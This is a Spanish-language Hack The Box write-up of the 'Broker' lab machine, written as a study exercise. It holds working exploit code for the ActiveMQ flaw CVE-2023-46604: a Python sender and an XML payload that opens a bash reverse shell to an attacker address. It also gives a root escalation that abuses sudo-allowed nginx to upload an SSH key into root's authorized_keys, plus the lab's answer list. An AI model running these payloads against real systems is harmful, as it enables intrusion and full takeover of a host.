---
title: Writeup broker - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - broker
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina broker en Hack The Box.
keywords:
  - writeup broker
  - hack the box broker
  - resolución máquina broker
  - broker hack the box
  - htb broker
---
------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Broker)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=XbCu_NSKqbw)|[Parte2](https://www.youtube.com/watch?v=UqJJgh62rtw)|[Parte3](https://www.youtube.com/watch?v=bcLNv56Ys6I)|[Parte4](https://www.youtube.com/watch?v=0NZuTp20ckI)
- 🧠 **Explicación resumida**: 

------------

#easy #linux #nmap #ping #sudo-l #abusobinarionginx #CVE-2023-46604 #reverseshell  #tratamientotty #ssh

-----------
# Guided Mode

1)¿Qué puerto TCP abierto está ejecutando el servicio ActiveMQ?
	61616

2)¿Cuál es la versión del servicio ActiveMQ que se está ejecutando en el equipo?
	5.15.15

3)¿Cuál es el CVE-ID de 2023 para una vulnerabilidad de ejecución remota de código en la versión de ActiveMQ que se ejecuta en Broker?
	CVE-2023-46604

4)¿Con qué usuario se ejecuta el servicio ActiveMQ en el broker?
	activemq

*La pregunta anterior era la flag de user.txt*
6)¿Cuál es la ruta completa del binario que el usuario activemq puede ejecutar como cualquier otro usuario con sudo?
	/usr/sbin/nginx

7)¿Qué directiva de nginx se puede utilizar para definir los métodos WebDAV permitidos?
	dav_methods

8)¿Qué método HTTP se utiliza para escribir archivos a través del protocolo WebDAV?
	put

9)¿Qué indicador se utiliza para establecer una configuración personalizada de Nginx especificando un archivo?
	-c

--------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.11.243
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.11.243 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,80,1883,5672,8161,43111,61613,61614,61616 10.10.11.243 -oN target
```

![[Broker9.png]]

![[Broker8.png]]

![[Broker7.png]]

![[Broker6.png]]

![[Broker5.png]]

![[Broker4.png]]

![[Broker3.png]]
*TTL:* Maquina linux
*Puertos Importantes*
	`22` [[ssh]]
	`80`HTTP
	`61616` ActiveMQ

-------
# [[Whatweb-wappalyzer]]

```shell
whatweb http://10.10.11.243
```

![[Broker2.png]]

![[Broker1.png]]

La informacion relevante que encuentro es que esta corriendo un Nginx

--------
# [[CVE-2023-46604]] y [[Reverse shell]] para ganar acceso

Entramos a la url del *ActiveMQ* http://10.10.11.243:61616/ nos salen estos caracteres no legibles, pero podemos entender que esta corriendo la version 5.15.15. Buscando en internet vemos que para esta version esta el [[CVE-2023-46604]]
![[Broker13.png]]


[Repositorio del cual saque el archivo poc para linux](https://github.com/rootsecdev/CVE-2023-46604/blob/main/poc-linux.xml) y aca el repositorio del cual saque el [script de python](https://raw.githubusercontent.com/vulhub/vulhub/refs/heads/master/activemq/CVE-2023-46604/poc.py)
Les dejo el contenido de los archivos

#### poc.py
```python
import io
import socket
import sys


def main(ip, port, xml):
    classname = "org.springframework.context.support.ClassPathXmlApplicationContext"
    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_obj.connect((ip, port))

    with socket_obj:
        out = socket_obj.makefile('wb')
        # out = io.BytesIO()  # 创建一个内存中的二进制流
        out.write(int(32).to_bytes(4, 'big'))
        out.write(bytes([31]))
        out.write(int(1).to_bytes(4, 'big'))
        out.write(bool(True).to_bytes(1, 'big'))
        out.write(int(1).to_bytes(4, 'big'))
        out.write(bool(True).to_bytes(1, 'big'))
        out.write(bool(True).to_bytes(1, 'big'))
        out.write(len(classname).to_bytes(2, 'big'))
        out.write(classname.encode('utf-8'))
        out.write(bool(True).to_bytes(1, 'big'))
        out.write(len(xml).to_bytes(2, 'big'))
        out.write(xml.encode('utf-8'))
        # print(list(out.getvalue()))
        out.flush()
        out.close()


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Please specify the target and port and poc.xml: python3 poc.py 127.0.0.1 61616 "
              "http://192.168.0.101:8888/poc.xml")
        exit(-1)
    main(sys.argv[1], int(sys.argv[2]), sys.argv[3])
```


### poc.xml
```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>bash</value>
            <value>-c</value>
            <!-- This command will give a reverse shell on port 9001. HTML Entity Encoded. Change IP as needed -->
            <value>bash -i &#x3E;&#x26; /dev/tcp/10.10.16.9/443 0&#x3E;&#x26;1</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```

Y ahora mientras estamos levantando un server http con [[python3 -m http.server]] con el comando `python3 -m http.server 80` vamos a compartir el archivo *poc.xml* , a la vez que estamos en escucha con [[nc -nlvp 443]] para que se entable la [[Reverse shell]]. El ultimo paso seria ejecutar el script con el comando ``python3 poc.py 10.10.11.243 61616 http://10.10.16.9:80/poc.xml``


![[Broker15.png]]

![[Broker14.png]]

![[Broker16.png]]
Ya ganamos acceso a la maquina

------
# [[Tratamiento de la TTY]]

--------
# Escalada de privilegios con [[Abuso de Sudo]] del [[Binario nginx]]

```shell
sudo -l
```

![[Broker17.png]]
Vemos que podemos ejecutar el binario */usr/sbin/nginx* sin proporcionar contraseña


Vamos al directorio */tmp* y vamos a crear un archivo que se llame *nginx_pwn.conf* con este contenido

```shell
user root;
worker_processes 1;
pid /tmp/nginx.pid;

events {
    worker_connections 768;
}

http {
    server {
        listen 1339;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```

El archivo configura nginx para ejecutarse como root, escuchar en el puerto 1339, servir el directorio raíz `/` por HTTP, mostrar listados de carpetas y permitir subidas de archivos mediante el método PUT.

![[Broker10.png]]

Despues vamos a iniciar nginx como si fueramos sudo con la configuracion que pusimos en el archivo que creamos con el comando `sudo /usr/sbin/nginx -c /tmp/nginx_pwn.conf` 
Vamos a subir le archivo del usuario *root* al usuario *activemq* con `curl -X PUT http://localhost:1339/root/.ssh/authorized_keys -d "$(cat ~/.ssh/id_rsa.pub)"`

Ahora vamos al directorio con [[cd]] usando el comando`cd ~/.ssh`  y por ultimo nos vamos a conectar a [[ssh]] con el comando `ssh -i id_rsa root@localhost`

![[Broker11.png]]
Ya estamos conectados como root y podemos catear las flags 

![[Broker12.png]]


